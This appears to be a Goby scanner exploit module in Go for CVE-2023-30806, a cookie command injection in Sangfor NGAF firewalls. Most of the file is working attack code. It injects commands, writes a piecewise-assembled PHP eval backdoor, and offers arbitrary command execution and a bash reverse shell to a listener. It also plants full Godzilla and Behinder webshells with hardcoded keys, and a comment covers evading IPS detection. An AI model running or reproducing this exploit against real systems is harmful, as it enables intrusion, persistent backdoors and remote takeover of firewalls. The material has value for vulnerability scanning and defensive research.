package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Sangfor next-generation firewall NGAF login.cgi remote command execution vulnerability(CVE-2023-30806)",
    "Description": "<p>Sangfor next-generation firewall is a next-generation application firewall designed with application security requirements in mind.</p><p>Sangfor next-generation firewall has a command execution vulnerability at the PHPSESSID under the login.cgi file. An attacker can use this vulnerability to execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "SANGFOR-NGAF",
    "Homepage": "https://www.sangfor.com.cn/",
    "DisclosureDate": "2023-10-05",
    "PostTime": "2023-10-09",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "title=\"SANGFOR | NGAF\" || banner=\"Redirect.php?url=LogInOut.php\" || header=\"Redirect.php?url=LogInOut.php\" || cert=\"SANGFORNGAF\" || cert=\"SANGFOR NGAF\" || body=\"SANGFOR FW\" || title=\"SANGFOR | AF \" || title=\"SANGFOR AF\" || body=\"if (!this.SF)\" || ((body=\"SF.cookie('sangfor_session_id\" || (body=\"version = _(\\\"异步获取提交成功，但是获取版本信息失败\\\");\" && body=\"this.sf = {};\")) && body!=\"<div class=\\\"title title-login\\\">登录防火墙WEB防篡改管理系统</div>\") || (body=\"return decodeURIComponent(arr.join(''))\" && body=\"name=\\\"robots\\\" content=\\\"nofollow\\\"\" && cert!=\"Organization: WEBUI\") || (title==\"欢迎登录\" && body=\"<img src=\\\"Captcha.php?r=123123\\\" alt=\\\"verify_code\\\" id=\\\"verify_code\\\">\" && body=\"<input type=\\\"hidden\\\" id=\\\"rsa_key\\\" value\")",
    "GobyQuery": "title=\"SANGFOR | NGAF\" || banner=\"Redirect.php?url=LogInOut.php\" || header=\"Redirect.php?url=LogInOut.php\" || cert=\"SANGFORNGAF\" || cert=\"SANGFOR NGAF\" || body=\"SANGFOR FW\" || title=\"SANGFOR | AF \" || title=\"SANGFOR AF\" || body=\"if (!this.SF)\" || ((body=\"SF.cookie('sangfor_session_id\" || (body=\"version = _(\\\"异步获取提交成功，但是获取版本信息失败\\\");\" && body=\"this.sf = {};\")) && body!=\"<div class=\\\"title title-login\\\">登录防火墙WEB防篡改管理系统</div>\") || (body=\"return decodeURIComponent(arr.join(''))\" && body=\"name=\\\"robots\\\" content=\\\"nofollow\\\"\" && cert!=\"Organization: WEBUI\") || (title==\"欢迎登录\" && body=\"<img src=\\\"Captcha.php?r=123123\\\" alt=\\\"verify_code\\\" id=\\\"verify_code\\\">\" && body=\"<input type=\\\"hidden\\\" id=\\\"rsa_key\\\" value\")",
    "Level": "3",
    "Impact": "<p>An attacker can use this vulnerability to execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://www.sangfor.com.cn/\">https://www.sangfor.com.cn/</a></p>",
    "References": [
        "https://labs.watchtowr.com/yet-more-unauth-remote-command-execution-vulns-in-firewalls-sangfor-edition/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,webshell,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla,behinder,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test9730.php",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php echo \"hello\"; ?>",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2023-30806"
    ],
    "CNNVD": [
        "CNNVD-202310-660"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "深信服下一代防火墙 NGAF login.cgi 文件远程命令执行漏洞（CVE-2023-30806）",
            "Product": "SANGFOR-NGAF",
            "Description": "<p>深信服下一代防火墙是一款以应用安全需求出发而设计的下一代应用防火墙。<br></p><p>深信服下一代防火墙在 login.cgi  路径下，PHPSESSID 处存在命令执行漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.sangfor.com.cn/\">https://www.sangfor.com.cn/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Sangfor next-generation firewall NGAF login.cgi remote command execution vulnerability(CVE-2023-30806)",
            "Product": "SANGFOR-NGAF",
            "Description": "<p>Sangfor next-generation firewall is a next-generation application firewall designed with application security requirements in mind.</p><p>Sangfor next-generation firewall has a command execution vulnerability at the PHPSESSID under the login.cgi file. An attacker can use this vulnerability to execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://www.sangfor.com.cn/\">https://www.sangfor.com.cn/</a><br></p>",
            "Impact": "<p>An attacker can use this vulnerability to execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10843"
}`
	base64EncodeJWEIOOPQUEJOIF := func(input string) string {
		inputBytes := []byte(input)
		encodedString := base64.StdEncoding.EncodeToString(inputBytes)
		return encodedString
	}
	sendPayloadWEQJEIOPWEUDS := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		requestConfig := httpclient.NewPostRequestConfig("/cgi-bin/login.cgi")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Content-Type", "Application/X-www-Form")
		requestConfig.Header.Store("y-forwarded-for", "127.0.0.1")
		requestConfig.Header.Store("Cookie", "PHPSESSID=`$("+payload+")`;")
		requestConfig.Data = "{\"opr\":\"login\", \"data\":{\"user\": \"watchTowr\" , \"pwd\": \"watchTowr\" , \"vericode\": \"NSLB\" , \"privacy_enable\": \"0\"}}"
		return httpclient.DoHttpRequest(hostInfo, requestConfig)
	}
	checkFileExistsKCIOIEOQWIU := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		getFileConfig := httpclient.NewGetRequestConfig("/svpn_html/" + uri)
		getFileConfig.VerifyTls = false
		getFileConfig.FollowRedirect = false
		getFileConfig.Header.Store("y-forwarded-for", "127.0.0.1")
		return httpclient.DoHttpRequest(hostInfo, getFileConfig)
	}
	executePhpCodeIQEWJIEJCSAD := func(hostInfo *httpclient.FixUrl, tinyTroName, cmd string) (*httpclient.HttpResponse, error) {
		commandConfig := httpclient.NewPostRequestConfig("/svpn_html/" + tinyTroName)
		commandConfig.VerifyTls = false
		commandConfig.FollowRedirect = false
		commandConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		commandConfig.Header.Store("y-forwarded-for", "127.0.0.1")
		commandConfig.Data = "poo=" + cmd
		return httpclient.DoHttpRequest(hostInfo, commandConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			randStr := goutils.RandomHexString(10)
			randFileName := goutils.RandomHexString(6) + ".txt"
			resp, err := sendPayloadWEQJEIOPWEUDS(hostInfo, "echo "+randStr+" > /fwlib/sys/virus/webui/svpn_html/"+randFileName)
			if err == nil && resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "Have Not HTTP_Cookie") {
				respGetFile, err := checkFileExistsKCIOIEOQWIU(hostInfo, randFileName)
				if err == nil && respGetFile != nil && respGetFile.StatusCode == 200 && strings.Contains(respGetFile.RawBody, randStr) {
					sendPayloadWEQJEIOPWEUDS(hostInfo, "rm /fwlib/sys/virus/webui/svpn_html/"+randFileName)
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType != "cmd" && attackType != "webshell" && attackType != "reverse" {
				expResult.Success = false
				expResult.Output = "未知的攻击方式"
				return expResult
			}
			// 判断文件是否存在，存在则不执行。为了避免每次都重新生成随机名，然后多次发包，所以小马文件名写死
			respCheck, err := checkFileExistsKCIOIEOQWIU(expResult.HostInfo, "g7x.php")
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			} else if respCheck != nil && respCheck.StatusCode != 200 {
				// 先传小马上去，方便后面操作，马分多次分段写入
				// txt 只能用1位，php 文件名只能用3位以下
				resp1, err := sendPayloadWEQJEIOPWEUDS(expResult.HostInfo, "echo -e -n \"<?php\\n\" > /fwlib/sys/virus/webui/svpn_html/1.txt")
				resp2, err := sendPayloadWEQJEIOPWEUDS(expResult.HostInfo, "echo -e -n \"eval\" > /fwlib/sys/virus/webui/svpn_html/2.txt")
				resp3, err := sendPayloadWEQJEIOPWEUDS(expResult.HostInfo, "echo -e -n '($_POST[\"poo' > /fwlib/sys/virus/webui/svpn_html/3.txt")
				resp4, err := sendPayloadWEQJEIOPWEUDS(expResult.HostInfo, "echo -e -n '\"])' > /fwlib/sys/virus/webui/svpn_html/4.txt")
				resp5, err := sendPayloadWEQJEIOPWEUDS(expResult.HostInfo, "echo -e -n \"\\n?>\\n\" > /fwlib/sys/virus/webui/svpn_html/5.txt")
				respTrojan, err := sendPayloadWEQJEIOPWEUDS(expResult.HostInfo, "cat /fwlib/sys/virus/webui/svpn_html/1.txt /fwlib/sys/virus/webui/svpn_html/2.txt /fwlib/sys/virus/webui/svpn_html/3.txt /fwlib/sys/virus/webui/svpn_html/4.txt /fwlib/sys/virus/webui/svpn_html/5.txt> /fwlib/sys/virus/webui/svpn_html/g7x.php")
				// 删除前面的txt包，留下小马
				respDel, err := sendPayloadWEQJEIOPWEUDS(expResult.HostInfo, "echo $(rm /fwlib/sys/virus/webui/svpn_html/1.txt)-$(rm /fwlib/sys/virus/webui/svpn_html/2.txt)-$(rm /fwlib/sys/virus/webui/svpn_html/3.txt)-$(rm /fwlib/sys/virus/webui/svpn_html/4.txt)-$(rm /fwlib/sys/virus/webui/svpn_html/5.txt)")
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				} else if (resp1 != nil && resp1.StatusCode != 200) || (resp2 != nil && resp2.StatusCode != 200) || (resp3 != nil && resp3.StatusCode != 200) || (resp4 != nil && resp4.StatusCode != 200) || (resp5 != nil && resp5.StatusCode != 200) || (respTrojan != nil && respTrojan.StatusCode != 200) || (respDel != nil && respDel.StatusCode != 200) {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				// 严格判断，只有当小马确实成功上传了，才会进入其他exp流程
			}
			if attackType == "cmd" {
				cmd := goutils.B2S(stepLogs.Params["cmd"])
				if len(cmd) < 3 { // 命令太短时，base64 解析失败执行不了命令
					cmd = fmt.Sprintf("echo %s | sh", cmd)
				}
				respCmd, errCmd := executePhpCodeIQEWJIEJCSAD(expResult.HostInfo, "g7x.php", "echo system($_POST[1] (\""+url.QueryEscape(base64EncodeJWEIOOPQUEJOIF(strings.ReplaceAll(cmd, `"`, `\"`)))+"\"));&1=base64_decode")
				if errCmd != nil {
					expResult.Success = false
					expResult.Output = errCmd.Error()
					return expResult
				} else if respCmd != nil && respCmd.StatusCode == 200 {
					expResult.Success = true
					lastIndex := strings.LastIndex(respCmd.RawBody, "\n")
					expResult.Output = respCmd.RawBody[:lastIndex]

				} else {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
					return expResult
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				//rp就是拿到的监听端口
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					expResult.Output = "godclient bind failed!"
					expResult.Success = false
					return expResult
				} else {
					reverse := godclient.ReverseTCPByBash(rp)
					_, err := executePhpCodeIQEWJIEJCSAD(expResult.HostInfo, "g7x.php", "echo system($_POST[1] (\""+url.QueryEscape(base64EncodeJWEIOOPQUEJOIF(reverse))+"\"));&1=base64_decode")
					if err != nil {
						return expResult
					}
					select {
					case webConsoleID := <-waitSessionCh:
						u, err := url.Parse(webConsoleID)
						if err != nil {
							expResult.Success = false
							expResult.Output = err.Error()
							return expResult
						}
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					case <-time.After(time.Second * 20):
						expResult.Success = false
						expResult.Output = "漏洞利用失败"
					}
				}
			} else if attackType == "webshell" {
				webshell := goutils.B2S(stepLogs.Params["webshell"])
				content := goutils.B2S(stepLogs.Params["content"])
				filename := goutils.RandomHexString(6) + ".php"
				if webshell == "godzilla" {
					content = "<?php\n@session_start();\n@set_time_limit(0);\n@error_reporting(0);\nfunction encode($D,$K){\n    for($i=0;$i<strlen($D);$i++) {\n        $c = $K[$i+1&15];\n        $D[$i] = $D[$i]^$c;\n    }\n    return $D;\n}\n$pass='pass1234';\n$payloadName='payload';\n$key='81dc9bdb52d04dc2';\nif (isset($_POST[$pass])){\n    $data=encode(base64_decode($_POST[$pass]),$key);\n    if (isset($_SESSION[$payloadName])){\n        $payload=encode($_SESSION[$payloadName],$key);\n        if (strpos($payload,\"getBasicsInfo\")===false){\n            $payload=encode($payload,$key);\n        }\n\t\teval($payload);\n        echo substr(md5($pass.$key),0,16);\n        echo base64_encode(encode(@run($data),$key));\n        echo substr(md5($pass.$key),16);\n    }else{\n        if (strpos($data,\"getBasicsInfo\")!==false){\n            $_SESSION[$payloadName]=encode($data,$key);\n        }\n    }\n}\n"
				} else if webshell == "behinder" {
					content = "<?php\n@error_reporting(0);\nsession_start();\n    $key=\"594f803b380a4139\";\n  $_SESSION['k']=$key;\n  session_write_close();\n  $post=file_get_contents(\"php://input\");\n  if(!extension_loaded('openssl'))\n  {\n    $t=\"base64_\".\"decode\";\n    $post=$t($post.\"\");\n    \n    for($i=0;$i<strlen($post);$i++) {\n           $post[$i] = $post[$i]^$key[$i+1&15]; \n          }\n  }\n  else\n  {\n    $post=openssl_decrypt($post, \"AES128\", $key);\n  }\n    $arr=explode('|',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n  class C{public function __invoke($p) {eval($p.\"\");}}\n    @call_user_func(new C(),$params);\n?>"
				} else if webshell == "custom" {
					filename = goutils.B2S(stepLogs.Params["filename"])
					content = goutils.B2S(stepLogs.Params["content"])
				} else {
					expResult.Success = false
					expResult.Output = `未知的的利用方式`
					return expResult
				}
				// $_POST 前面必须有一个空格
				respWebshell, errWebshell := executePhpCodeIQEWJIEJCSAD(expResult.HostInfo, "g7x.php", " $_POST[3]($_POST[4],$_POST[1]($_POST[2]));&2="+base64EncodeJWEIOOPQUEJOIF(content)+"&1=base64_decode&3=file_put_contents&4="+filename)
				if err != nil {
					expResult.Success = false
					expResult.Output = errWebshell.Error()
					return expResult
				} else if respWebshell != nil && respWebshell.StatusCode != 200 && respWebshell.StatusCode != 500 {
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
					return expResult
				}
				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/svpn_html/" + filename + "\n"
				// 有 IPS 防护设备，默认的马和密码都需要修改，不然特征流量会被拦截。
				if webshell == "godzilla" {
					expResult.Output += "密码: pass1234 密钥：1234 加密器：PHP_XOR_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				} else if webshell == "behinder" {
					expResult.Output += "Password: aaaaa\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				}
				expResult.Output += "Webshell type: php\n"
				if webshell == "custom" {
					expResult.Output = "File URL: " + expResult.HostInfo.FixedHostInfo + "/svpn_html/" + filename + "\n"
				}
				expResult.Output += "HTTP请求头: Y-Forwarded-For: 127.0.0.1"
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
